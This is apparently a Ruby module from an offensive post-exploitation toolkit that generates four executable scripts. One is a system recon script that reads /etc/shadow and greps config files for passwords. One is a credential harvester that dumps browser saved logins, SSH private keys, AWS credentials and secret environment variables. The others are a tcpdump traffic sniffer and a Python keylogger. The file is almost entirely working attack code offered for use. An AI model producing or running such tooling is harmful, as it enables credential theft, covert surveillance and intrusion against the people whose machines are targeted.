require_relative '../utils/colorize'

class PostExploitation
  def self.generate_recon_script
    recon = <<~SH
      #!/bin/bash
      
      echo "=== System Information ===" > recon.txt
      uname -a >> recon.txt
      cat /etc/os-release >> recon.txt
      
      echo "" >> recon.txt
      echo "=== Network Configuration ===" >> recon.txt
      ifconfig >> recon.txt
      ip addr >> recon.txt
      route -n >> recon.txt
      
      echo "" >> recon.txt
      echo "=== Users ===" >> recon.txt
      cat /etc/passwd >> recon.txt
      cat /etc/shadow >> recon.txt
      
      echo "" >> recon.txt
      echo "=== Processes ===" >> recon.txt
      ps aux >> recon.txt
      
      echo "" >> recon.txt
      echo "=== Network Connections ===" >> recon.txt
      netstat -antp >> recon.txt
      ss -antp >> recon.txt
      
      echo "" >> recon.txt
      echo "=== Installed Software ===" >> recon.txt
      dpkg -l >> recon.txt 2>/dev/null
      rpm -qa >> recon.txt 2>/dev/null
      
      echo "" >> recon.txt
      echo "=== Cron Jobs ===" >> recon.txt
      crontab -l >> recon.txt 2>/dev/null
      cat /etc/crontab >> recon.txt 2>/dev/null
      ls -la /etc/cron.* >> recon.txt 2>/dev/null
      
      echo "" >> recon.txt
      echo "=== SUID/SGID Files ===" >> recon.txt
      find / -perm -4000 -type f 2>/dev/null >> recon.txt
      find / -perm -2000 -type f 2>/dev/null >> recon.txt
      
      echo "" >> recon.txt
      echo "=== Writable Directories ===" >> recon.txt
      find / -writable -type d 2>/dev/null | head -20 >> recon.txt
      
      echo "" >> recon.txt
      echo "=== SSH Keys ===" >> recon.txt
      find /home -name "*.pem" -o -name "id_rsa" -o -name "id_dsa" 2>/dev/null >> recon.txt
      
      echo "" >> recon.txt
      echo "=== Database Credentials ===" >> recon.txt
      find / -name "*.conf" -o -name "*.ini" -o -name "*.cnf" 2>/dev/null | xargs grep -i "password\|user" 2>/dev/null >> recon.txt
      
      cat recon.txt
    SH
    
    filename = "recon_#{Time.now.to_i}.sh"
    File.write(filename, recon)
    File.chmod(filename, 0755)
    puts Colorize.green("Recon script saved: #{filename}")
    filename
  end

  def self.generate_credential_harvester
    harvester = <<~SH
      #!/bin/bash
      
      echo "=== Browser Credentials ===" > credentials.txt
      
      if [ -d ~/.mozilla ]; then
        find ~/.mozilla -name "*.sqlite" -exec sqlite3 {} "SELECT * FROM moz_logins" \; >> credentials.txt 2>/dev/null
      fi
      
      if [ -d ~/.config/google-chrome ]; then
        find ~/.config/google-chrome -name "Login Data" -exec sqlite3 {} "SELECT * FROM logins" \; >> credentials.txt 2>/dev/null
      fi
      
      echo "" >> credentials.txt
      echo "=== SSH Keys ===" >> credentials.txt
      cat ~/.ssh/id_rsa >> credentials.txt 2>/dev/null
      cat ~/.ssh/id_dsa >> credentials.txt 2>/dev/null
      cat ~/.ssh/config >> credentials.txt 2>/dev/null
      
      echo "" >> credentials.txt
      echo "=== AWS Credentials ===" >> credentials.txt
      cat ~/.aws/credentials >> credentials.txt 2>/dev/null
      cat ~/.aws/config >> credentials.txt 2>/dev/null
      
      echo "" >> credentials.txt
      echo "=== Environment Variables ===" >> credentials.txt
      env | grep -i "pass\|key\|secret\|token" >> credentials.txt
      
      cat credentials.txt
    SH
    
    filename = "credential_harvester_#{Time.now.to_i}.sh"
    File.write(filename, harvester)
    File.chmod(filename, 0755)
    puts Colorize.green("Credential harvester saved: #{filename}")
    filename
  end

  def self.generate_network_sniffer
    sniffer = <<~SH
      #!/bin/bash
      
      interface=$(ip route | grep default | awk '{print $5}' | head -1)
      
      tcpdump -i $interface -w capture_#{Time.now.to_i}.pcap -s 0 &
      PID=$!
      
      echo "Sniffing on $interface (PID: $PID)"
      echo "Press Ctrl+C to stop"
      
      trap "kill $PID; exit" INT
      wait
    SH
    
    filename = "sniffer_#{Time.now.to_i}.sh"
    File.write(filename, sniffer)
    File.chmod(filename, 0755)
    puts Colorize.green("Network sniffer saved: #{filename}")
    filename
  end

  def self.generate_keylogger
    keylogger = <<~PYTHON
      #!/usr/bin/env python3
      try:
          import pynput
          import sys
          
          def on_press(key):
              try:
                  with open('keylog_#{Time.now.to_i}.txt', 'a') as f:
                      f.write(str(key) + '\\n')
              except:
                  pass
          
          def on_release(key):
              if key == pynput.keyboard.Key.esc:
                  return False
          
          with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
              listener.join()
      except ImportError:
          print("pynput library required: pip install pynput")
    PYTHON
    
    filename = "keylogger_#{Time.now.to_i}.py"
    File.write(filename, keylogger)
    File.chmod(filename, 0755)
    puts Colorize.green("Keylogger saved: #{filename}")
    filename
  end
end

